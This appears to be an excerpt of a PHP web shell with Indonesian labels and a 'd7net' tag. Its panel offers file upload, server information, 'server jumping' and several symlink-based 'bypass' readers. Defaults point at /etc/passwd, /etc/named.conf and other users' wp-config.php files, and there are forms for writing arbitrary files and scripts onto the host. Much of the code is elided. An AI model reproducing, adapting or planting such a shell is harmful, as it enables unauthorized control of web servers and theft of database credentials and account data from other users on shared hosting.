...
<body bgcolor="#00216E" text="#ffffff">
<style>
...
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&info=d7net">Infomarsi Server</a>&nbsp; </th>';
...
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&jump=d7net">Jumping server</a>&nbsp; </th>';
...
<input type="submit" name="bepas" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
    ...
    if (!$d00m) {
        die("<hr><br><center><a class='button' href='?dir=$lokasi&symread=d7net'>Bypass Read</a> <a class='button' href='?dir=$lokasi&sym_404=d7net'>Symlink 404</a> <a class='button' href='?dir=$lokasi&sym_bypas=d7net'>Symlink Bypass</a><br><br/><font color='red'>Can't read   /etc/named.conf</font><br/><br/></center><br>");
    } else {
        echo "[ <a href='?dir=$dir&symread=d7net'>Bypass Read</a> ] [ <a href='?dir=$lokasi&sym_404=d7net'>Symlink 404</a> ] [ <a href='?dir=$lokasi&sym_bypas=d7net'>Symlink Bypass</a> ]<div class='tmp'>
...
if ($_GET['symread'] == 'd7net') {
    ...
    echo "<form method='post' action='?dir=$dir&symread=d7net&save=1'>
...
if ($_GET['sym_404'] == 'd7net') {
    echo '<center><h2>Symlink 404</h2>
        <form method="post">
            File Target: <input type="text" class="form-control" name="dir" value="/home/user/public_html/wp-config.php"><br><br>
            Save As: <input type="text" class="form-control" name="isi" placeholder="file.txt"/><br><br/>
...
if ($_GET['sym_bypas'] == 'd7net') {
    ...
    echo "<br/><form method='post' action='?dir=$lokasi&sym_bypas=d7net&save=1'>
            <textarea class='form-control' rows='8' name='file'>";
    flush();
    $file = '/etc/passwd';
    $r3ad = @fopen($file, 'r');
	...
	<input type='text' name='d_dir' value='$lokasi' style='width: 450px;' height='10'><br><br>
	<font style='text-decoration: ;'>Nama File:</font><br>
	<input type='text' name='d_file' value='' style='width: 450px;' height='width: 100px;' placeholder='isi nick'><br><br>
	<font style='text-decoration: ;'>Isi File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;' placeholder='isi script'></textarea><br>
...
exit;
	...
	elseif ($_REQUEST['buatfile'] == "d7net") {
		echo "<center>
    <form method='POST'>
        <input type='text' class='form-control' value='$lokasi/filekamu.php' style='width: 310px;' name='nama_file' autocomplete='off' placeholder='Nama File...'><br><br/>
